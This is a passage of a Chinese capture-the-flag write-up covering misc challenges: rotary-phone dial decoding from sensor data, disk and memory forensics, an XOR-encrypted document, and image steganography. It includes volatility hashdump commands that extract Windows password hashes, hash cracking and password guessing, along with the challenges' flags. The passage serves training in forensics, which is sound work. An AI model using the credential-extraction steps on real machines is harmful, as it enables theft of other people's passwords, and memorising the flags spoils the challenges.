+COS_N = [] 
+ 
+with open('adc.csv') as f: 
+	next(f) # 跳过第一行 
+	reader = csv.reader(f)  	for line in reader:  	SIN_P.append(int(line[0])) 
+	SIN_N.append(int(line[1])) 
+	COS_P.append(int(line[2])) COS_N.append(int(line[3])) 
+ 
+# 振幅A 
+SIN_AMP = max(SIN_P)-min(SIN_P) 
+COS_AMP = max(COS_P)-min(COS_P) print(SIN_AMP, COS_AMP) 
+ 
+# 偏移k 
+SIN_OFF = min(SIN_P)+SIN_AMP//2 
+COS_OFF = min(COS_P)+COS_AMP//2 print(SIN_OFF, COS_OFF) 
+ 
+SIN_P_std = [] 
+COS_P_std = [] 
+ 
+for i in range(len(SIN_P)): 
+	SIN_P_std.append((SIN_P[i]-SIN_OFF)*(2/SIN_AMP)) 
+	COS_P_std.append((COS_P[i]-COS_OFF)*(2/COS_AMP))
+	plt.scatter(range(len(SIN_P)),SIN_P_std) plt.scatter(range(len(COS_P)),COS_P_std) 
+
+ plt.grid(True) 
+ plt.show()
+
+</code></pre>
+<p>运行脚本得到散点图。</p>
+<figure data-type="image" tabindex="81"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/b88d7565b0fad.png" alt="1629870587980.png" loading="lazy"></figure>
+<p>sin 为蓝色，cos 为橙色</p>
+<p>开始时sin=0，cos=1，使用α=arctan(sin/cos)可得角度为0.</p>
+<p>根据题目描述可以猜想这个设备安装在了一个转轮电话的转盘上，根据转动的角度就可以推出拨出的号 码。</p>
+<p>图上用红色标出了11个区间，正好对应11位电话号码。</p>
+<p>每个区间都有一个特点：传感器转动一定角度然后按反方向转回。这使得确定转动的角度非常简单，只需找每个区间中间的值计算角度即可。</p>
+<p>修改上面的脚本：</p>
+<pre><code class="language-python">import csv  
+import math  
+import numpy as np
+import matplotlib.pyplot as plt 
+ 
+SIN_P = [] 
+SIN_N = [] 
+COS_P = [] 
+COS_N = [] 
+ 
+with open('adc.csv') as f:  	
+	next(f) # 跳过第一行 
+ 	reader = csv.reader(f)  	
+ 	for line in reader:  
+		SIN_P.append(int(line[0])) 
+ 		SIN_N.append(int(line[1])) 
+ 		COS_P.append(int(line[2])) COS_N.append(int(line[3])) 
+ 
+ # 振幅A 
+SIN_AMP = max(SIN_P)-min(SIN_P) 
+COS_AMP = max(COS_P)-min(COS_P) print(SIN_AMP, COS_AMP) 
+ 
+# 偏移k 
+SIN_OFF = min(SIN_P)+SIN_AMP//2 
+COS_OFF = min(COS_P)+COS_AMP//2 print(SIN_OFF, COS_OFF) 
+ 
+SIN_P_std = [] 
+COS_P_std = [] 
+ 
+for i in range(len(SIN_P)): 
+ 	SIN_P_std.append((SIN_P[i]-SIN_OFF)*(2/SIN_AMP)) 
+	COS_P_std.append((COS_P[i]-COS_OFF)*(2/COS_AMP)) 
+ 
+# plt.scatter(range(len(SIN_P)),SIN_P_std) 
+# plt.scatter(range(len(COS_P)),COS_P_std) 
+ 
+# 手动选出的x坐标 
+# 第1和第2个图像基本一样，所以第2个用的第1个的值 
+candidates = [160, 160, 638, 883, 1080, 1275, 1474, 1612, 1732, 1880, 2070] 
+ 
+angles = [] 
+ 
+ for i in candidates: 
+ 	# atan2计算arctan，并会考虑sin和cos的正负 
+ 	# degrees把弧度转为角度 
+ 	angle = math.degrees(math.atan2(SIN_P_std[i], COS_P_std[i])) 
+ 	angle = angle if angle &gt; 0 else 360+angle # -180~180 转为 0~360  
+    print(angle) 
+	angles.append(angle) 
+ 
+plt.scatter(range(11), angles) 
+ 
+plt.grid(True) 
+plt.show()
+
+</code></pre>
+<p>运行得到下图：</p>
+<figure data-type="image" tabindex="82"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/2d6f390798b65.png" alt="1629870833703.png" loading="lazy"></figure>
+<p>转轮电话有不同的设计，有的把 1 放在最前（转动角度最小），把 0 放在 9 之后（转动角度最大）</p>
+<p>另外的 把 0 放在最前。</p>
+<p>x=7 与 x=8 的值差得比较大，它们应该相差 2 位；其他相邻的相差 1 位</p>
+<p>在数据中只可⻅9 个级别的转动角度，这是因为最大角度或最小角度的数没有出现。</p>
+<p><strong>根据上面的推断总结共有 3 种情况：</strong></p>
+<p>\1. x=7 为 0，x=8 为 2，x=2 为 8</p>
+<p>\2. x=7 为 1，x=8 为 3，x=2 为 9</p>
+<p>\3.x=7 为 2，x=8 为 4，x=2 为 0</p>
+<p>经提交发现第三种是正确的</p>
+<p>Flag: flag{77085962457}</p>
+<h2 id="misc2-层层取证">misc2 层层取证</h2>
+<p>首先下载题目解压得到两个文件</p>
+<p>一个是系统内存dump，一个是硬盘的镜像.我们先来看硬盘镜像，解压出来如下</p>
+<figure data-type="image" tabindex="83"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/7392cd27bfbb5.png" alt="1629871128464.png" loading="lazy"></figure>
+<p><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/80d46e9ed67e0.png" alt="1629871155467.png" loading="lazy">\</p>
+<p>从Forensic_image.001.txt中我们可以知道这是由FTK Imager制作的硬盘镜像</p>
+<p>使用FTK Imager的镜像挂载功能，我们直接挂载物理磁盘</p>
+<figure data-type="image" tabindex="84"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/a3908c0257aea.png" alt="1629871203412.png" loading="lazy"></figure>
+<p>成功挂载后，我们使用disk genius打开</p>
+<figure data-type="image" tabindex="85"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/fa6fae53665b0.png" alt="1629871223438.png" loading="lazy"></figure>
+<p>我们可以看到一共有三个分区，最后一个分区是BitLocker加密，那么答案已经显而易见了，找到BitLocker密码即可</p>
+<p>先在另外两个盘找找线索，把关键词都收集一下</p>
+<figure data-type="image" tabindex="86"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/f66959323ff12.png" alt="1629871259530.png" loading="lazy"></figure>
+<p>最后在Windows 7分区的用户文件夹中发现两个用户名XiaoMing和XinSai</p>
+<p>经过尝试，BitLocker的密码是XiaoMing，成功解锁</p>
+<figure data-type="image" tabindex="87"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/74bcb162cbc82.png" alt="1629871283201.png" loading="lazy"></figure>
+<p>解锁分区后发现里面有一个2.pcapng（wireshark流量包），导出来</p>
+<p>使用wireshark打开</p>
+<p>经过分析发现存在一段异常UDP数据，我们追踪udp流</p>
+<figure data-type="image" tabindex="88"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/07e78e0b5b8a4.png" alt="1629871315070.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="89"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/95e0bbb3992b6.png" alt="1629871339627.png" loading="lazy"></figure>
+<p>在首部发现rar文件头Rar!和flag文字，我们以原数据格式保存下来</p>
+<figure data-type="image" tabindex="90"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/cd00f50db2beb.png" alt="1629871363772.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="91"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/587bc4513bf09.png" alt="1629871378432.png" loading="lazy"></figure>
+<p>接下来尝试解出rar密码</p>
+<p>使用XiaoMing和XinSai解密以及爆破均无结果，在硬盘中也找不出多余信息了，猜测线索可能在系统内存dump中，首先尝试获取用户密码</p>
+<p>先用volatility从memdump.mem内存获取到注册表中的system 的 virtual 地址，SAM 的 virtual 地址。使用命令：vol.exe -f memdump.mem --profile=Win7SP1x64 hivelist</p>
+<figure data-type="image" tabindex="92"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/7c3c7c505b76e.png" alt="1629871402475.png" loading="lazy"></figure>
+<p>拿到virtual 地址后，接着从内存中获取密码哈希</p>
+<p>使用命令：vol.exe -f memdump.mem --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000ce7410</p>
+<p>得到了几位用户的密码hash，最终用户名为xiaoming的密码hash为92efa7f9f2740956d51157f46521f941，用md5解出来得到: xiaoming_handsome</p>
+<figure data-type="image" tabindex="93"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/28b77a47fafa2.png" alt="1629871437254.png" loading="lazy"></figure>
+<p>经过尝试，rar的密码就是：xiaoming_handsome</p>
+<p>打开压缩包，得到flag.docx ，尝试打开，发现需要密码</p>
+<figure data-type="image" tabindex="94"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/896b1032262a8.png" alt="1629871465313.png" loading="lazy"></figure>
+<p>用volatility 列举一下memdump.mem的进程</p>
+<p>使用命令：vol.exe -f memdump.mem --profile=Win7SP1x64 pslist</p>
+<figure data-type="image" tabindex="95"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/ddb27c904f126.png" alt="1629871488573.png" loading="lazy"></figure>
+<p>发现了  Windows Tablet PC 便笺工具——StikyNot.exe的进程，PID是2572</p>
+<figure data-type="image" tabindex="96"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/7b963963972c3.png" alt="1629871514531.png" loading="lazy"></figure>
+<p>我们把他dump下来分析一下</p>
+<p>使用命令：vol.exe -f memdump.mem --profile=Win7SP1x64 memdump -p 2572 -D F:\CTF2\CTF工具箱\数字取证\volatility-master\volatility-master\祥云杯</p>
+<figure data-type="image" tabindex="97"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/091ba8c76b7cf.png" alt="1629871538529.png" loading="lazy"></figure>
+<p>现在就成功将这个进程保存下来了</p>
+<figure data-type="image" tabindex="98"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/023ec35beb3fd.png" alt="1629871557633.png" loading="lazy"></figure>
+<p>用foremost对这个2572.dmp分离一下得到了一些文件</p>
+<figure data-type="image" tabindex="99"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/b2729c26bb4f4.png" alt="1629871586857.png" loading="lazy"></figure>
+<p>在StikyNotes被删除后 都会保留在StickyNotes.snt文件里，在foremost分离出的ole文件夹中发现了 00004600.ole，里面的内容就是 StickyNotes.snt的内容</p>
+<figure data-type="image" tabindex="100"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/2a190208a65db.png" alt="1629871610742.png" loading="lazy"></figure>
+<p>用记事本Notepad等文本编辑器打开00004600.ole，找字符串“fs22”，每个fs22都是一个便签内容的开头，然后可以看到英文内容，而中文内容是以加密的“'xx\ 'xx”形式存在的，然后每行都会以&quot;\par&quot;结尾。</p>
+<p>所以这里打开这个文件，搜索“fs22”,发现了 b5'b5'c3'dc'c2'eb'a3'baxiaoming1314\par</p>
+<figure data-type="image" tabindex="101"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/0649318278c9a.png" alt="1629871638640.png" loading="lazy"></figure>
+<p>/par不要,同时把\’替换成%，得到%b5%b5%c3%dc%c2%eb%a3%baxiaoming1314</p>
+<p>然后进行url解码，记得编码选择gb2312，不然解出来是乱码</p>
+<figure data-type="image" tabindex="102"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/d768cd4699110.png" alt="1629871664817.png" loading="lazy"></figure>
+<p>得到word文档的密码为：xiaoming1314</p>
+<p>打开flag.docx得到flag{9ca871b668f2-b668-097c-cbm8-9op404c891e2}</p>
+<figure data-type="image" tabindex="103"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/c455923402163.png" alt="1629871689851.png" loading="lazy"></figure>
+<h2 id="misc3-考古">misc3 考古</h2>
+<p>首先下载题目文件解压得到 memory</p>
+<p>我们使用取证工具 volatility 分析</p>
+<p>volatility.exe -f memory imageinfo</p>
+<figure data-type="image" tabindex="104"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/d926b85ea4e62.png" alt="1629871783476.png" loading="lazy"></figure>
+<p>发现是 WinXPSP2x86 的内存 dump，和题目提示一致</p>
+<p>接下来我们使用 volatility 的 cmdscan 插件扫描命令行记录</p>
+<figure data-type="image" tabindex="105"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/0f670641c67bd.png" alt="1629871822257.png" loading="lazy"></figure>
+<p>可以看到命令行记录这里还有一段出题人留下的小剧本（出题人有心了）大致意思就是小明在打开电脑的时候发现内存不够，于是打算清理一下内存，听说有个一键清理程序非常有用，就 try it，执行后就发现被黑了，联想题目信息一致，那么答案已经很明显了，我们只要找到这个 Oneclickcleanup.exe 就完事</p>
+<p>使用 volatility 的 filescan 插件扫描内存中的文件，配合 grep 筛选</p>
+<p>volatility.exe -f memory --profile=WinXPSP2x86 filescan | grep exe</p>
+<figure data-type="image" tabindex="106"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/c3aec593b144b.png" alt="1629871856444.png" loading="lazy"></figure>
+<p>可以看到就在桌面上，我们再使用 dumpfiles 插件把这个文件 dump 下来</p>
+<p>volatility.exe -f memory --profile=WinXPSP2x86 dumpfiles -Q 0x00000000017bcbc0 -D proc</p>
+<figure data-type="image" tabindex="107"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/03f8c768ace20.png" alt="1629871885589.png" loading="lazy"></figure>
+<p>得到两个 exe 和一些数据，但是 Image 我运行不起来</p>
+<figure data-type="image" tabindex="108"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/a4f2e0029f5e7.png" alt="1629871907828.png" loading="lazy"></figure>
+<p>将 Data 和 image 拖入 IDA,进 main 函数，直接 F5，发现这两个文件，算法都差不多</p>
+<figure data-type="image" tabindex="109"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/780162e888188.png" alt="1629871927583.png" loading="lazy"></figure>
+<p>这一步是加载秘钥图，有点像 RC4 那个秘钥生成，当然,key 的内容如下</p>
+<figure data-type="image" tabindex="110"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/82f419526558b.png" alt="1629871963381.png" loading="lazy"></figure>
+<p>size 也是固定的</p>
+<figure data-type="image" tabindex="111"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/89ccd7c70f752.png" alt="1629871985658.png" loading="lazy"></figure>
+<p>被加密的文件的数据</p>
+<figure data-type="image" tabindex="112"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/95b066bb40f24.png" alt="1629872005266.png" loading="lazy"></figure>
+<p>算法很简单，就是用 data_start 循环异或 this_a_key，直接写脚本提取吧！</p>
+<figure data-type="image" tabindex="113"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/fab2d6d3d89bc.png" alt="1629872031734.png" loading="lazy"></figure>
+<p>另一个文件也是同理，这里不过叙述，然后得到 DOC 文件</p>
+<figure data-type="image" tabindex="114"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/a30c056f5ef96.png" alt="1629872067524.png" loading="lazy"></figure>
+<p>最后发现可以试着将 word 文档进行 xor 异或解密。</p>
+<p>在 csdn 上发现了现成的解 xor 异或的脚本</p>
+<p>链接: <code>https://blog.csdn.net/ctwy291314/article/details/88820930</code></p>
+<p><strong>脚本如下：</strong></p>
+<pre><code class="language-python"># -* -coding: UTF-8 -* -
+# 功能:异或方式对文件进行加密和解密
+import os
+import datetime
+
+
+# 主函数
+def main():
+    getInput()
+
+
+# 输入参数
+def getInput():
+
+    # 获取操作的参数
+    while(True):
+
+        oper = input(&quot;请输入操作(e:加密 d:解密):&quot;)
+
+        if(oper == &quot;e&quot; or oper == &quot;d&quot;):
+            break
+        else:
+            print(&quot;输入有误，请重新输入!&quot;)
+
+    # 获取文件密码
+    while(True):
+
+        password = input(&quot;请输入密码:&quot;)
+    
+        if(len(password) == 0):
+            print(&quot;密码不能为空!&quot;)
+        else:
+            break
+
+    # 获取操作的文件路径
+    while(True):
+
+        path = input(&quot;请输入文件路径（示例：C:\\test.txt）:&quot;)
+
+        try:
+            f_read = open(path, &quot;rb&quot;)
+        except:
+            print(&quot;文件没有找到，请检查路径是否存在！&quot;)
+        else:
+            break
+
+    # 进行加密或解密操作
+    if(oper == &quot;e&quot;):
+        encrypt(path, password)
+    elif(oper == &quot;d&quot;):
+        decrypt(path, password)
+
+
+# 加密
+def encrypt(path, password):
+    start = datetime.datetime.now()
+    # 因为刚学可能有库可以直接获取这些信息吧，不过自己写个算法获取这些信息也没什么难度
+    fileFullName = path.split(os.path.sep)  # os.path.sep为操作系统的文件分隔符
+    fileName = fileFullName[len(fileFullName) - 1].split(&quot;.&quot;)[0]
+    fileSuffix = fileFullName[len(fileFullName) - 1].split(&quot;.&quot;)[1]
+
+    # print(&quot;文件全名称:&quot;,fileFullName[len(fileFullName)-1])
+    # print(&quot;文件名称:&quot;,fileName)
+    # print(&quot;文件后缀:&quot;,fileSuffix)
+
+    fileParent = path[0:len(path) - len(fileFullName[len(fileFullName) - 1])]
+    newFileName = &quot;加密_&quot; + fileFullName[len(fileFullName) - 1]
+    newFilePath = fileParent + newFileName
+
+    # print(&quot;文件父路径:&quot;,fileParent)
+    # print(&quot;新的文件名称:&quot;,newFileName)
+    # print(&quot;新的文件全路径:&quot;, newFilePath)
+
+    f_read = open(path, &quot;rb&quot;)
+    f_write = open(newFilePath, &quot;wb&quot;)
+
+    count = 0  # 当前密码加密索引
+
+    # 我们采用异或循环加密
+    for now in f_read:  # 通过迭代器逐行访问
+        for nowByte in now:  # 通过迭代器逐字符处理
+            newByte = nowByte ^ ord(password[count % len(password)])
+            count += 1
+            f_write.write(bytes([newByte]))
+
+    f_read.close()
+    f_write.close()
+    
+    end = datetime.datetime.now()
+    print(&quot;文件加密完毕^_^&quot;, (end - start))
+
+
+# 解密（因为我们采取的异或解密，所以其实和加密算法一样）
+def decrypt(path, password):
+    start = datetime.datetime.now()
+    fileFullName = path.split(os.path.sep)  # os.path.sep为操作系统的文件分隔符
+    fileName = fileFullName[len(fileFullName) - 1].split(&quot;.&quot;)[0]
+    fileSuffix = fileFullName[len(fileFullName) - 1].split(&quot;.&quot;)[1]
+
+    # print(&quot;文件全名称:&quot;, fileFullName[len(fileFullName)-1])
+    # print(&quot;文件名称:&quot;, fileName)
+    # print(&quot;文件后缀:&quot;, fileSuffix)
+
+    fileParent = path[0:len(path) - len(fileFullName[len(fileFullName) - 1])]
+    newFileName = &quot;解密_&quot; + fileFullName[len(fileFullName) - 1]
+    newFilePath = fileParent + newFileName
+
+    # print(&quot;文件父路径:&quot;, fileParent)
+    # print(&quot;新的文件名称:&quot;, newFileName)
+    # print(&quot;新的文件全路径:&quot;, newFilePath)
+
+    f_read = open(path, &quot;rb&quot;)
+    f_write = open(newFilePath, &quot;wb&quot;)
+
+    count = 0  # 当前密码加密索引
+
+    # 我们采用异或循环加密
+    for now in f_read:  # 通过迭代器逐行访问
+        for nowByte in now:  # 通过迭代器逐字符处理
+            newByte = nowByte ^ ord(password[count % len(password)])
+            count += 1
+            f_write.write(bytes([newByte]))
+
+    f_read.close()
+    f_write.close()
+    end = datetime.datetime.now()
+    print(&quot;文件解密完毕&quot;, (end - start))
+
+
+main()
+</code></pre>
+<p>这个脚本是既可以加密也可以解密，运用的时候选择解密即可。解密是需要密钥的，不同的密钥解密后会得到不同的答案。</p>
+<p><strong>这里写个爆破密钥的脚本：</strong></p>
+<pre><code class="language-python">file_path = r&amp;apos;./1tas2.doc&amp;apos;
+f_read = open(file_path, &quot;rb&quot;).read()
+for i in range(33,127):
+	s = &quot;&quot;
+ 	for now in f_read:
+		newByte = now ^ i
+		s += chr(newByte)
+	if &amp;apos;flag&amp;apos; in s:
+		print(i)
+		print(s)
+ 		break
+</code></pre>
+<p>我们得到了密钥是 chr(45),也就是减号- ，然后我们用上面的脚本解密</p>
+<figure data-type="image" tabindex="115"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/3979e39a6aede.png" alt="1629872275184.png" loading="lazy"></figure>
+<p>这里显示文件已经解密完成了，我们返回这个 word 文档的路径，发现了解密后的 word 文档</p>
+<figure data-type="image" tabindex="116"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/8bb8a349378ed.png" alt="1629872362687.png" loading="lazy"></figure>
+<p>打开后，他会让我们选择文档的编码，如果里面存在 flag，那么肯定应该选 ascii 编码了，否则肯定会出现乱码的情况，这里我们选择 US-ASCII 编码 然后确定</p>
+<figure data-type="image" tabindex="117"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/17af5d5b9f594.png" alt="1629872380655.png" loading="lazy"></figure>
+<p>进入之后CTRL+F，搜索 flag 字样，最终发现了 flag为 flag{8bedfdbb-ba42-43d1-858c-c2a5-5012d309}</p>
+<figure data-type="image" tabindex="118"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/1a5adba9ee780.png" alt="1629872411441.png" loading="lazy"></figure>
+<h2 id="misc5-鸣雏恋">misc5 鸣雏恋</h2>
+<p>下载下来是一个 docx 文件，并有 40 多 MB，猜测里面藏了东西，放进 010 分析</p>
+<figure data-type="image" tabindex="119"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/8965aa130f33b.png" alt="1629872544324.png" loading="lazy"></figure>
+<p>标准的 zip 形式，改文件后缀-&gt;解压-&gt;关注_rels 文件</p>
+<p>里面的 love.zip 需要密码，显然密码是在 key.txt 里，光看文字，没什么发现，但仔细观察下面的列数</p>
+<figure data-type="image" tabindex="120"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/a245add952365.png" alt="1629872571370.png" loading="lazy"></figure>
+<p>毫无疑问，隐藏了字符，直接零宽解就行</p>
+<p>得到解压密码： Because I like naruto best</p>
+<figure data-type="image" tabindex="121"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/26f5d3e9fe3a3.png" alt="1629872611253.png" loading="lazy"></figure>
+<p>里面除了鸣人就是</p>
+<p>雏田，这种情况可以将二者转换成 01 或者摩斯 ，先来转换 01 吧，可以通过 CRC 确定图片的属性，不过我一直有个疑惑，明明雏田的 CRC 值是 0xB3CE44BB ，但我通过脚本得出来的却是 0x67322cc8 ，还好这其实并不影响去判断它们，只要鸣人和雏田的 CRC 不一样就行了</p>
+<p>这是图片转 01 的脚本：</p>
+<pre><code class="language-python">import binascii
+hash=''
+c=0
+dd=''
+for i in range(0,129487):
+	for a in open('C:\\AppData\\gaming\\love\\out\\'+str(i)+'.png', &quot;rb&quot;):
+		hash=(binascii.crc32(a))
+	d=hex(hash)
+	if d=='0x67322cc8':
+		c=0
+	else:
+ 		c=1
+	dd+=str(c)
+	print(dd)
+</code></pre>
+<p>然后二进制转文本：</p>
+<pre><code class="language-python">with open('C:\\AppData\\gaming\\1.txt') as f:
+	s=f.read()
+	flag = ''
+	c = ''
+	for i in range(0, len(s), 8):
+		c = chr(int(s[i:i + 8], 2))
+	flag += c
+	print(flag)
+</code></pre>
+<figure data-type="image" tabindex="122"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/70d0c455f3d24.png" alt="1629872789950.png" loading="lazy"></figure>
+<p>得到：</p>
+<pre><code>data:image/png;base64,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
